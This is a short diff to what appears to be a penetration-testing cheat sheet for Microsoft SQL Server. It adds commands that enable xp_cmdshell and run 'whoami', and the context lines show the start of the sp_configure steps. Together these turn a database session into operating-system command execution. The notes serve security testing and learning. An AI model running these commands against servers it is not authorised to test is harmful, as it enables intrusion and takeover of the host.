@@ -46,6 +46,12 @@ select * from <table_name>;     #show content
 SELECT * FROM INFORMATION_SCHEMA.TABLES;
 ```
 ## Enable xp_cmdshell
+1.
+```bash
+enable_xp_cmdshell
+xp_cmdshell whoami
+```
+2.
 ```bash
 EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
